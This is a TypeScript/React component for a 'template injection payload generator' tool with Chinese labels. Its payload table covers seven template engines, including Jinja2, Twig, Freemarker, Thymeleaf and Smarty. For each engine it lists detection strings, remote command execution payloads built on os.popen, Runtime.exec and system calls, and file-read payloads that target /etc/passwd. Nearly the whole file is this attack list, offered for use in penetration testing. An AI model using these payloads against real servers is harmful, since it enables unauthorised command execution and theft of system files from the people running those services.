import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

const ENGINE_OPTIONS = [
  { value: 'jinja2', label: 'Jinja2' },
  { value: 'twig', label: 'Twig' },
  { value: 'freemarker', label: 'Freemarker' },
  { value: 'thymeleaf', label: 'Thymeleaf' },
  { value: 'velocity', label: 'Velocity' },
  { value: 'el', label: 'EL' },
  { value: 'smarty', label: 'Smarty' },
];

const PAYLOADS: Record<string, { detect: string[]; rce: string[]; fileread: string[] }> = {
  jinja2: {
    detect: ['{{7*7}}', "{{7*'+'7}}", "{{ ''.__class__ }}", '{{ config }}', '{{ request }}', '${7*7}'],
    rce: [
      "{{ ''.__class__.__mro__[1].__subclasses__() }}",
      "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
      "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
      "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}",
      "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
      "{{ namespace.__init__.__globals__.os.popen('id').read() }}",
    ],
    fileread: [
      "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}",
      "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}",
      "{{ lipsum.__globals__.os.popen('cat /etc/passwd').read() }}",
    ],
  },
  twig: {
    detect: ['{{7*7}}', '{{7*'+'7}}', '{{_self}}', '{{_self.env}}'],
    rce: [
      "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
      "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('whoami')}}",
      "{{['id']|filter('system')}}",
      "{{['cat /etc/passwd']|filter('system')}}",
    ],
    fileread: [
      "{{source?file('/etc/passwd')}}",
      "{{_self.env.registerUndefinedFilterCallback('file_get_contents')}}{{_self.env.getFilter('/etc/passwd')}}",
    ],
  },
  freemarker: {
    detect: ['${7*7}', '#{7*7}', '<%= 7*7 %>', '[=7*7]'],
    rce: [
      "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}",
      "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"cat /etc/passwd\")}",
      "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
      "[#assign code=\"freemarker.template.utility.Execute\"?new()][${code(\"whoami\")}]",
    ],
    fileread: [
      "<#assign iscs=object?api.class.protectionDomain.classLoader.loadClass(\"freemarker.template.utility.Execute\")?new()>${iscs(\"cat /etc/passwd\")}",
      "${object?api.class.getResourceAsStream(\"/etc/passwd\").read()}",
    ],
  },
  thymeleaf: {
    detect: ['__${7*7}__', '${7*7}', '*{7*7}', '{{7*7}}'],
    rce: [
      "__${T(java.lang.Runtime).getRuntime().exec('id')}__",
      "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()}__",
      "__${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}__",
      "#{T(java.lang.Runtime).getRuntime().exec('whoami')}",
    ],
    fileread: [
      "__${new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\\\A').next()}__",
      "__${T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/etc/passwd'))}__",
    ],
  },
  velocity: {
    detect: ['$math.sub(1,0)', '${7*7}', '#set($x=7)'],
    rce: [
      "#set($e=\"exp\")#set($c=$e.getClass().forName(\"java.lang.Runtime\"))#set($m=$c.getMethod(\"getRuntime\"))#set($r=$m.invoke(null))#set($p=$c.getMethod(\"exec\",$e.getClass()))$p.invoke($r,\"id\")",
      "#set($cmd=\"id\")#set($is=$content.inspect($cmd))##",
      "#set($str=$class.inspect(\"java.lang.String\"))#set($chr=$class.inspect(\"java.lang.Character\"))#set($ex=$class.inspect(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"id\"))",
    ],
    fileread: [
      "#set($f=$class.inspect(\"java.io.FileReader\"))#set($r=$f.construct(\"/etc/passwd\"))#set($b=$class.inspect(\"java.io.BufferedReader\").construct($r))#foreach($n in [1..100])$b.readLine()#end",
    ],
  },
  el: {
    detect: ['${7*7}', '#{7*7}', '${1+1}'],
    rce: [
      "${Runtime.getRuntime().exec('id')}",
      "${Runtime.getRuntime().exec('cat /etc/passwd')}",
      "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
      "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
    ],
    fileread: [
      "${new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\\\A').next()}",
      "${T(java.nio.file.Files).readAllLines(T(java.nio.file.Path).of('/etc/passwd'))}",
    ],
  },
  smarty: {
    detect: ['{$smarty.version}', '{7*7}', '{$a="x"}'],
    rce: [
      "{system('id')}",
      "{system('cat /etc/passwd')}",
      "{exec('whoami')}",
      "{passthru('id')}",
      "{Smarty::$fetch(\"string:{system('id')}\")}",
    ],
    fileread: [
      "{file_get_contents('/etc/passwd')}",
      "{readfile('/etc/passwd')}",
      "{include file='/etc/passwd'}",
    ],
  },
};

const generate = (engine: string): string => {
  const data = PAYLOADS[engine] ?? PAYLOADS.jinja2;
  return [
    `=== SSTI Payload（Engine: ${engine}）===`,
    '',
    '--- 检测 Payload（Detection）---',
    ...data.detect.map((p) => `  ${p}`),
    '',
    '--- RCE Payload（远程命令执行）---',
    ...data.rce.map((p) => `  ${p}`),
    '',
    '--- 文件读取 Payload ---',
    ...data.fileread.map((p) => `  ${p}`),
  ].join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="模板注入Payload生成器"
    paramsConfig={[
      { name: 'engine', label: '模板引擎', type: 'select', options: ENGINE_OPTIONS, default: 'jinja2' },
    ]}
    execute={(
      _input: string,
      _mode: string,
      params: Record<string, unknown>,
    ): string => generate((params.engine as string) ?? 'jinja2')}
  />
);

export default ToolComponent;
